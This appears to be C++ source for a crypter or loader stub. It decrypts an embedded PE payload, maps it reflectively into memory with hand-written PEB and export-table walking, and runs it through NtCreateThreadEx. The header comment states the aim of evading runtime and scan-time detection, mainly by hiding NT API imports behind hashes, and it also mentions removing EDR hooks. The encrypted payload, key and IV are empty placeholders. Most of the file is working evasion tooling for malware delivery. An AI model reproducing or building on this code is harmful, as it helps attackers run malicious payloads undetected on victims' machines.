#include <iostream>
#include <windows.h>
#include <winternl.h>
/*
#include <unordered_map>
#include <shlwapi.h>  // For PathFileExists
#pragma comment(lib, "Shlwapi.lib") // Needed for PathFileExists
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <tchar.h>
#include <stdbool.h>
#include <random>
*/
#include "../resource/globals.h"
#include "../resource/utils.h"
#include "../resource/dll_utils.h"
#include "../resource/pe_loader.h"


/*
Decrypts and executes an embedded 64-bit Portable Executable (PE) in memory. When the PE is mapped in the virtual address 
space of the stub, its import address table (IAT) is resolved recursively while completely avoiding LoadLibraryA, LdrLoadDll, 
GetModuleHandle, and GetProcAddress. GetModuleHandle was implemented manually (get_dll_base) by parsing the process environment block (PEB),
iterating through a linked list of loaded modules, and returning the base address of the DLL when a match is found on the DLL 
name. GetProcAddress (resolveAddr) was implemented manually by taking a module handle from get_dll_base, iterating through its export address
table (EAT), and returning the function address on a match either by name or hashed function name. Since LoadLibraryA 
actually maps DLLs into memory that aren't loaded by default (like kernel32.dll or ntdll.dll), as well as returning the module handle,
it uses the same manual mapping method as the PE payload with a few extra steps. When a DLL needs to be resolved for the PE payload, 
the same load_pe function is called for it, except it recursively calls map_dll when resolving imports. This ensures every DLL dependency
tree that any DLL might have is mapped into memory and relocated. After a base case occurs (IAT is empty), the recursive map_dll call chain returns up the 
callstack by executing the TLS callbacks for the current DLL, calling dllMain, and returning the handle. The caller's IAT is then populated 
with the returned dll base.

This removes the need to use LoadLibraryA, LdrLoadDll, GetModuleHandle, and GetProcAddress completetly, making the stub much less susceptible to
runtime and scantime detections.

After the payload's IAT is populated, all of its addresses are relocated based on the actual base address. The mapped sections are iterated 
over again, so that they can be given the minimum required permissions. When the DLLs and payload are mapped into memory, the regions are 
only given read-write permissions, and only the sections that require read-execute are given that systematically, so there is not one 
large read-write-execute region in memory corresponding to the entire PE. After permissions are updated, a thread is created and passed 
the payload's entry point address. 

The only Windows API functions (that would be flagged as suspicious) used were NtAllocateVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx.
To remove them from the IAT, they are pre-hashed and resolved dynamically, using the manual implementation of GetModuleHandle for the base address 
of ntdll.dll, and the manual implementation of GetProcAddress. Ntdll.dll is loaded into every process by default so there is no need to manually
map it into memory. 

Additionally, hooks in NtAllocateVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx can be detected dynamically and removed. This was
done by checking their function prologues for jumps when resolving their addresses. 

Additionally, when the DLLs and PE are mapped into memory, the region is only given read-write permissions, and only the sections that require 
read-execute are given that systematically, so there is not one large read-write-execute region in memory corresponding to the entire PE. 
*/

using namespace std;

/*
// Used for payload and DLL imports pe_loader.h / pe_loader.cpp
void* load_pe(PIMAGE_NT_HEADERS ntHeaders, const vector<unsigned char>& data);
void relocate_pe(PIMAGE_NT_HEADERS ntHeaders, void* baseAddress);
bool resolve_imports(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders);
void* resolve_addr(HMODULE hModule, const char* name, DWORD hash); //used 
void execute_tls(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders);
HMODULE map_dll(const char* dllName);

// Only used by payload, but uses shared functions -- could just be in main file
void execute(const vector<unsigned char> &payload);



// utils.h / utils.cpp
void resolveFuncPointers(DWORD *hashes, HMODULE handle); // function pointers need to be global 
DWORD getHashFromString(const char *string);
vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv);


// dll_utils.h / dll_utils.cpp
vector<unsigned char> read_dll(const wchar_t* dllPath);
HMODULE get_dll_base(const wchar_t* name);
bool findDllPath(const char* dllName, wchar_t* outPath, size_t outSize);

// globals.h / globals.cpp 
unordered_map<string, HMODULE> loadedDlls;
#define CURRENT_PROCESS_HANDLE ((HANDLE)-1)

// Undocumented function pointer typedefs
// VirtualAlloc()

vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "error creating EVP context" << endl;
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "error initializing decryption" << endl;
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "decryption call failed" << endl;
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}

typedef struct _LDR_DATA_TABLE_ENTRY_EX {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;

DWORD getHashFromString(const char *string){
    size_t strlength = strnlen_s(string, 50);
    DWORD hash = 0x35;

    for(size_t i = 0; i < strlength; i++){
        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
    }

    return hash;
}

PEB* get_peb() {
    return (PEB*)__readgsqword(0x60);  
}

HMODULE get_dll_base(const wchar_t* name) {
    PEB* peb = get_peb();
    LIST_ENTRY* module_list = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current_entry = module_list->Flink;

    while (current_entry != module_list) {
        auto entry = CONTAINING_RECORD(current_entry, LDR_DATA_TABLE_ENTRY_EX, InMemoryOrderLinks);
        
        wchar_t* module_name = entry->BaseDllName.Buffer;
        if (_wcsicmp(module_name, name) == 0) {
            return (HMODULE)entry->DllBase;
        }
        current_entry = current_entry->Flink;
    }
    return nullptr;
}

vector<unsigned char> read_dll(const wchar_t* dllPath){
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        cerr << "CreateFileW failed with error " << GetLastError() << endl;
        return {};
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    vector<unsigned char> data(fileSize);

    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    return data;
}

void* resolve_addr(HMODULE hModule, const char* name, DWORD hash){
    auto dos_header = (PIMAGE_DOS_HEADER)hModule;
    auto nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos_header->e_lfanew);
    auto export_dir_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + export_dir_rva);
    auto num = export_dir->NumberOfFunctions;

    auto names = (DWORD*)((BYTE*)hModule + export_dir->AddressOfNames);
    auto functions = (DWORD*)((BYTE*)hModule + export_dir->AddressOfFunctions);
    auto ordinals = (WORD*)((BYTE*)hModule + export_dir->AddressOfNameOrdinals);

    for(DWORD i  = 0; i < export_dir->NumberOfNames; i++){
        const char *fn_name = (const char*)hModule + names[i];

        // Resolve by name, for the payloads imports that need to be resolved
        if(name && strcmp(fn_name, name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD fn_rva = functions[ordinal];
            return ((BYTE*)hModule + fn_rva);
        }
        // Resolve by hash, for functions that should not be in the stubs IAT
        if(!name){
            DWORD fn_hashed = getHashFromString(fn_name);
            if(fn_hashed == hash){
                WORD ordinal = ordinals[i];
                DWORD fn_rva = functions[ordinal];
                printf("Function: %s (hash: %u) resolved at: %p\n", fn_name, fn_hashed, ((BYTE*)hModule + fn_rva));
                if(strcmp(fn_name, "NtAllocateVirtualMemory") == 0 || strcmp(fn_name, "NtCreateThreadEx") == 0){
                    for(uint16_t j = 0; j < 21; j++){
                        cout << "0x" << (int)*((BYTE*)hModule + fn_rva + j) << " ";
                    }
                }

                return ((BYTE*)hModule + fn_rva);
            }
        }

    }
    cout << "Failed to resolve address for:\nHash:" << hash << "\nname:" << name << endl;
    return nullptr;
}


void execute_tls(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders){
    if(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0){
        PIMAGE_TLS_DIRECTORY tlsDir = (PIMAGE_TLS_DIRECTORY)((HMODULE)mappedBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tlsDir->AddressOfCallBacks;

        while(callback && *callback){
            (*callback)((LPVOID)mappedBase, DLL_PROCESS_ATTACH, NULL);
            callback++;
        }

    }
}

// Need to check if the DLL has already been 'seen' and is up the recursion tree, or if its in the PEB 
// In both cases just return the handle to it 
// In any other case it needs to be read from disk, mapped into memory, and we need to recursively check its imports 
// Base case: DLL has no imports, can apply relocations, execute TLS callbacks, execute dllmain, return to caller
HMODULE map_dll(const char* dllName){
    cout << "Mapping " << dllName << endl;
    auto it = loadedDlls.find(dllName);
    if(it != loadedDlls.end()){
        cout << dllName << " found in loadedDlls" << endl;
        return it->second;
        // if the DLL name is found in loadDlls, return the base address (second field of each map entry)
    }
    loadedDlls[dllName] = (HMODULE)0x1; // Mark the DLL as loading

    // Convert dllName to wide char, check if its already loaded in the process, but hasnt been seen yet
    wchar_t wDllName[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, dllName, -1, wDllName, MAX_PATH);
    HMODULE module = get_dll_base(wDllName);

    // Return base and add to dll map 
    if(module){
        cout << dllName << " found in PEB" << endl;
        loadedDlls[dllName] = module;
        return module;
    }

    wchar_t dllPath[MAX_PATH];
    if(!findDllPath(dllName, dllPath, MAX_PATH)){
        cerr << "Failed to locate DLL: " << dllName << endl;
        return NULL;
    }

    // DLL was located, read from disk 
    vector<unsigned char> data = read_dll(dllPath);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);

    void* mappedBase = load_pe(ntHeaders, data);
    if(!mappedBase){
        cerr << "Failed to write DLL to address space" << endl;
        return NULL;
    }

    execute_tls(mappedBase, ntHeaders);

    typedef BOOL(WINAPI* DllEntry)(HINSTANCE, DWORD, LPVOID);
    DllEntry entry = (DllEntry)((BYTE*)mappedBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)mappedBase, DLL_PROCESS_ATTACH, NULL);

    loadedDlls[dllName] = (HMODULE)mappedBase;

    return (HMODULE)mappedBase;
}


// Standard LoadLibraryA search paths, not all of them but sufficient for this 
bool findDllPath(const char* dllName, wchar_t* outPath, size_t outSize) {
    // Check in System32
    wsprintfW(outPath, L"C:\\Windows\\System32\\%hs", dllName);
    if (PathFileExistsW(outPath)) return true;

    // Check in SysWOW64
    wsprintfW(outPath, L"C:\\Windows\\SysWOW64\\%hs", dllName);
    if (PathFileExistsW(outPath)) return true;

    // Check in current directory
    wsprintfW(outPath, L"%hs", dllName);
    if (PathFileExistsW(outPath)) return true;

    return false; // DLL not found
}

void relocate_pe(PIMAGE_NT_HEADERS ntHeaders, void* baseAddress){
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)baseAddress + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (relocation->VirtualAddress > 0) {
            uintptr_t delta = (uintptr_t)((BYTE*)baseAddress - ntHeaders->OptionalHeader.ImageBase);

            int count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntry = (PWORD)((BYTE*)relocation + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < count; i++, relocEntry++) {
                if (*relocEntry & 0xF000) {
                    uintptr_t* patchAddr = (uintptr_t*)((BYTE*)baseAddress + relocation->VirtualAddress + (*relocEntry & 0xFFF));
                    *patchAddr += delta;
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
        }
    }
    cout << "Relocations applied" << endl;
    return;
}

void* load_pe(PIMAGE_NT_HEADERS ntHeaders, const vector<unsigned char>& data){
    void* baseAddress = NULL;
    SIZE_T regionSize = (SIZE_T)ntHeaders->OptionalHeader.SizeOfImage;
    NTSTATUS status = pNtAllocateVirtualMemory(
        CURRENT_PROCESS_HANDLE,
        (PVOID*)&baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        cerr << "NtAllocateVirtualMemory failed with status: " << status << endl;
        return nullptr;
    }
    cout << "Memory allocation at: " << baseAddress << endl;

    memcpy(baseAddress, data.data(), ntHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        void* sectionDest = (void*)((BYTE*)baseAddress + section->VirtualAddress);
        void* sectionSrc = (void*)((BYTE*)data.data() + section->PointerToRawData);
        memcpy(sectionDest, sectionSrc, section->SizeOfRawData);
        cout << "Section " << section->Name << " copied to " << sectionDest << endl;
    }

    relocate_pe(ntHeaders, baseAddress);
    cout << "Resolving imports" << endl;
    if(!resolve_imports(baseAddress, ntHeaders)){
        cerr << "Failed to resolve imports" << endl;
        return NULL;
    }

    return baseAddress;
}

bool resolve_imports(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders){
    if(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0){
        return true;
    }
    
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)mappedBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (importDescriptor->Name) {
        cout << "Resolving import " << importDescriptor->Name << endl;
        const char* dllName = (char*)((BYTE*)mappedBase + importDescriptor->Name);
        HMODULE module = NULL;
        // Same as earlier, check if its been seen, and will be processed eventually, then try and get a handle from the PEB
        // By the time this is called for the PE, all DLLs should have their handle in the loadedDlls map or be in the PEB
        auto it = loadedDlls.find(dllName);
        if(it != loadedDlls.end() && it->second != (HMODULE)0x1){
            cout << "Module found in loadedDlls" << endl;
            module = it->second;
        } else {
            wchar_t wDllName[MAX_PATH];
            MultiByteToWideChar(CP_UTF8, 0, dllName, -1, wDllName, MAX_PATH);
            module = get_dll_base(wDllName);

            if(!module){
                // Search for the module like LLA would
                module = map_dll(dllName);
                if(!module){
                    cerr << "Failed to map dependency " << dllName << endl;
                    return false;
                }
            } else {
                cout << "Module found in PEB" << endl;
            }
        }

        // Once the recursive calls hit a base case, patch the IAT for that DLL, work back up the callstack
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)mappedBase + importDescriptor->FirstThunk);
        while (thunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)mappedBase + thunk->u1.AddressOfData);
            FARPROC func = (FARPROC)resolve_addr(module, import->Name, 0);
            if (!func) {
                cerr << "Failed to get address of function: " << import->Name  << endl;
                return false;
            }
            
            thunk->u1.Function = (uintptr_t)func;
            thunk++;
        }
        importDescriptor++;
    }

    return true;
}*/

// Calls load_pe, sets final memory protections, creates a thread and executes
void execute(const vector<unsigned char> &payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    void* execMemory = load_pe(ntHeaders, payload);
    if(!execMemory){
        cerr << "Failed to allocate memory for PE" << endl;
        return;
    }
    cout << "Memory allocation at: " << execMemory << endl;    

    DWORD oldProtect;
    PIMAGE_SECTION_HEADER section =  IMAGE_FIRST_SECTION(ntHeaders);
    for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
        DWORD newProtect = PAGE_NOACCESS;
        SIZE_T regionSize = (SIZE_T)section->Misc.VirtualSize;
        void* sectionAddress = (BYTE*)execMemory + section->VirtualAddress;

        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = (section->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (section->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE;
        } else {
            newProtect = PAGE_READONLY;
        }
        
        NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &sectionAddress, &regionSize, newProtect, &oldProtect);
    }

    void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    cout << "Image entry point: " << entryPoint << endl;
    SIZE_T regionSize = 0x1000;

    // Use a copy of the base address because ntprotect aligns it to the page
    PVOID regionBase = entryPoint;
    NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &regionBase, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, CURRENT_PROCESS_HANDLE, (PVOID)entryPoint, NULL, FALSE, 0, 0, 0, NULL);

    if (!hThread) {
        cerr << "NtCreateThread failed with status: " << status  << endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }
    
    cout << "Thread created, waiting...\n";    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(execMemory, 0, MEM_RELEASE);
}

/*
void resolveFuncPointers(DWORD *hashes, HMODULE handle){
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)resolve_addr(handle, 0, hashes[0]);
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)resolve_addr(handle, 0, hashes[1]);
    pNtCreateThreadEx = (NtCreateThreadEx_t)resolve_addr(handle, 0, hashes[2]);

    void* realLLA = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    void* realVA = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    void* realCT = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    printf("[+] pNtAllocateVirtualMemory: %p : %p\n", pNtAllocateVirtualMemory, realLLA);
    printf("[+] pNtProtectVirtualMemory: %p : %p\n", pNtProtectVirtualMemory, realVA);
    printf("[+] pNtCreateThreadEx: %p : %p\n", pNtCreateThreadEx, realCT);

}*/

// Placeholders
const vector<unsigned char> ENCRYPTED = { /*ENCRYPTED_BYTES*/ };
const vector<unsigned char> KEY = { /*KEY*/ };
const vector<unsigned char> IV = { /*IV*/ };

int main(){
    cout << getHashFromString("NtAllocateVirtualMemory") << endl << getHashFromString("NtProtectVirtualMemory") << endl << getHashFromString("NtCreateThreadEx") << endl;
    DWORD hashes[] = {2947333021, 2924161265, 2276886725};

    vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
    resolveFuncPointers(hashes, get_dll_base(L"ntdll.dll"));
    execute(payload);

    return 0;
}